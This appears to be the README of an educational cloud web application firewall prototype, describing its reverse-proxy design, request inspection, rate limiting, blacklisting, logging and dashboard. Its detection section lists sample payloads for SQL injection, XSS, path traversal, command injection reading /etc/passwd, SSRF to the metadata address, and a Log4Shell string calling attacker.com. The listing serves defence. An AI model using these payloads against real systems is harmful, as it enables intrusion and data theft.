🛡️ CloudFort WAF

<div align="center">

Cloud-Based Web Application Firewall

A cloud-native Web Application Firewall (WAF) prototype designed to protect web applications from common application-layer attacks through reverse proxy protection, threat detection, attack logging, IP blacklisting, rate limiting, and real-time monitoring.

</div>

⸻

🚀 Live Demo

Protected Application

🔗 https://cloudfort-waf-demo-production.up.railway.app/

Security Dashboard

🔗 https://cloudfort-waf-demo-production.up.railway.app/dashboard/

⸻

📖 Overview

CloudFort WAF is a reverse-proxy security gateway that protects web applications from common web-based attacks before they reach the backend application.

Instead of allowing users to communicate directly with the application server, CloudFort sits in front of the application, inspects every HTTP request, detects malicious payloads, blocks threats, logs security events, and forwards only legitimate traffic.

The project demonstrates modern cybersecurity concepts including:

* Reverse Proxy Architecture
* Web Application Firewalls
* Application-Layer Security
* Attack Detection
* Security Monitoring
* Cloud Deployment
* Containerization
* DevSecOps Practices

⸻

🎯 Project Goals

The primary objectives of CloudFort WAF are:

* Protect web applications from common attacks
* Inspect application-layer HTTP traffic
* Detect malicious payloads
* Block suspicious requests
* Implement rate limiting
* Support IP blacklisting
* Store attack logs
* Visualize security events
* Demonstrate cloud-native security architecture
* Provide an educational WAF implementation

⸻

🏗️ System Architecture

                    ┌─────────────┐
                    │   Client    │
                    └──────┬──────┘
                           │
                           ▼
          ┌────────────────────────────────┐
          │         CloudFort WAF          │
          │                                │
          │  • IP Identification           │
          │  • Blacklist Validation        │
          │  • Rate Limiting               │
          │  • Payload Normalization       │
          │  • Attack Detection Engine     │
          │  • Severity Scoring            │
          │  • Request Blocking            │
          │  • Attack Logging              │
          │  • Security Headers            │
          └──────────────┬─────────────────┘
                         │
                         ▼
          ┌────────────────────────────────┐
          │           NexaStore            │
          │     Protected Application      │
          └────────────────────────────────┘
                         │
                         ▼
                    Response

⸻

⚙️ How It Works

Every incoming request follows the following lifecycle:

1️⃣ Client IP Identification

CloudFort extracts the source IP address.

The IP is used for:

* Rate limiting
* Blacklist checking
* Attack attribution
* Security logging

⸻

2️⃣ Request ID Generation

Each request receives a unique identifier.

Example:

REQ-2026-0001

This makes incident tracking easier.

⸻

3️⃣ Blacklist Validation

Before any inspection occurs, the WAF checks whether the IP address is blacklisted.

If found:

403 Forbidden

The request is immediately rejected.

⸻

4️⃣ Rate Limiting

CloudFort tracks request volume per IP.

If an IP exceeds the configured threshold:

429 Too Many Requests

is returned.

This helps prevent:

* Brute-force attacks
* Automated scanners
* Abuse attempts
* Excessive traffic

⸻

5️⃣ Payload Extraction

The WAF extracts request data from:

* URL paths
* Query parameters
* Request bodies
* HTTP headers
* User-Agent strings

⸻

6️⃣ Payload Normalization

Incoming payloads are normalized before inspection.

Normalization includes:

* URL decoding
* HTML entity decoding
* Null-byte removal
* Whitespace normalization

Example:

%3Cscript%3Ealert(1)%3C/script%3E

becomes:

<script>alert(1)</script>

This reduces encoding-based evasion attempts.

⸻

7️⃣ Detection Engine

The normalized payload is evaluated against attack signatures.

SQL Injection Detection

Examples:

' OR 1=1 --
UNION SELECT
DROP TABLE

⸻

Cross-Site Scripting (XSS)

Examples:

<script>alert(1)</script>
<img src=x onerror=alert(1)>

⸻

Path Traversal

Examples:

../../etc/passwd
..\..\windows\system32

⸻

Command Injection

Examples:

; whoami
&& cat /etc/passwd

⸻

SSRF

Examples:

http://127.0.0.1
http://169.254.169.254

⸻

XXE

Examples:

<!DOCTYPE foo>
<!ENTITY xxe SYSTEM>

⸻

Log4Shell-style Payloads

Examples:

${jndi:ldap://attacker.com/a}

⸻

Suspicious User Agents

Examples:

sqlmap
nikto
acunetix

⸻

🎯 Severity Scoring

Each detection rule contributes to a severity score.

Attack Type	Severity
XSS	Medium
SQL Injection	High
Path Traversal	High
SSRF	High
Command Injection	Critical

The final score determines whether a request should be blocked.

⸻

🚫 Blocking Logic

If the severity score exceeds the configured threshold:

403 Forbidden

The attack is blocked before reaching the protected application.

Otherwise:

Request Allowed

and the request is forwarded.

⸻

🔄 Clean Request Forwarding

Legitimate requests are forwarded to NexaStore while preserving:

* HTTP Method
* Request Body
* Query Parameters
* Required Headers

Flow:

Client
   ↓
CloudFort WAF
   ↓
NexaStore
   ↓
Response

⸻

🔒 Security Headers

CloudFort injects security headers into outgoing responses.

Examples:

X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'

These headers strengthen browser-side protection.

⸻

📊 Dashboard Features

The React Dashboard provides real-time visibility into security events.

Attack Overview

* Total Attacks
* Unique Attackers
* Blocked Requests

Threat Analytics

* Attack Categories
* Attack Distribution
* Hourly Activity

Attacker Visibility

* Top Attackers
* Source IP Monitoring

Blacklist Management

* View Blocked IPs
* Add IPs
* Remove IPs

Attack Logs

* Detailed Event Records
* Severity Levels
* Payload Information

⸻

📝 Attack Logging

Every detected attack is stored in SQLite.

Stored fields include:

* Request ID
* Source IP
* HTTP Method
* Request Path
* Attack Type
* Payload
* Severity Score
* Timestamp
* Action Taken

Example:

Field	Example
IP Address	192.168.1.10
Attack Type	SQL Injection
Method	POST
Path	/login
Severity	High
Action	Blocked

⸻

🔥 Security Features

Feature	Status
Reverse Proxy Protection	✅
SQL Injection Detection	✅
XSS Detection	✅
Path Traversal Detection	✅
Command Injection Detection	✅
SSRF Detection	✅
XXE Detection	✅
Log4Shell Detection	✅
Payload Normalization	✅
Rate Limiting	✅
IP Blacklisting	✅
Structured Logging	✅
Dashboard Monitoring	✅
Security Headers	✅
Docker Deployment	✅
Cloud Deployment	✅

⸻

🛠️ Technology Stack

Backend

* Python
* FastAPI
* HTTPX
* SQLite
* Uvicorn

Frontend

* React
* Vite
* JavaScript
* HTML
* CSS

Protected Application

* Node.js
* Express.js

Deployment

* Docker
* Railway

⸻

📁 Repository Structure

cloudfort-waf-demo/
│
├── cloud-waf/
│   ├── app/
│   │   ├── main.py
│   │   ├── detection.py
│   │   ├── database.py
│   │   ├── blacklist.py
│   │   ├── rate_limiter.py
│   │   └── config.py
│
├── demo-site/
│   ├── server.js
│   ├── package.json
│   └── public/
│
├── waf-dashboard/
│   ├── src/
│   ├── package.json
│   └── vite.config.js
│
├── Dockerfile
├── DEPLOYMENT.md
└── README.md

⸻

🚀 Local Installation

Clone Repository

git clone https://github.com/Mazen2004212/cloudfort-waf-demo.git
cd cloudfort-waf-demo

Run NexaStore

cd demo-site
npm install
npm start

Run CloudFort WAF

cd cloud-waf/app
pip install -r requirements.txt
uvicorn main:app --reload --port 8000

Run Dashboard

cd waf-dashboard
npm install
npm run dev

⸻

🐳 Docker Deployment

Build image:

docker build -t cloudfort-waf .

Run container:

docker run -p 8000:8000 cloudfort-waf

Application:

http://localhost:8000

Dashboard:

http://localhost:8000/dashboard

⸻

🔮 Future Enhancements

* Authentication System
* Role-Based Access Control (RBAC)
* PostgreSQL Integration
* Redis Rate Limiting
* SIEM Integration
* Email Alerts
* GeoIP Filtering
* OWASP CRS Compatibility
* Kubernetes Deployment
* CI/CD Integration
* Machine Learning Detection
* Threat Intelligence Feeds

⸻

⚠️ Disclaimer

CloudFort WAF is an educational and demonstration-oriented Web Application Firewall prototype designed to showcase reverse proxy architecture, application-layer attack detection, logging, monitoring, and cloud deployment.

It is not intended to replace enterprise-grade WAF solutions in production environments.

⸻

<div align="center">

🛡️ CloudFort WAF

Protect • Detect • Monitor

Built with ❤️ using FastAPI, React, Docker, and Railway

</div>
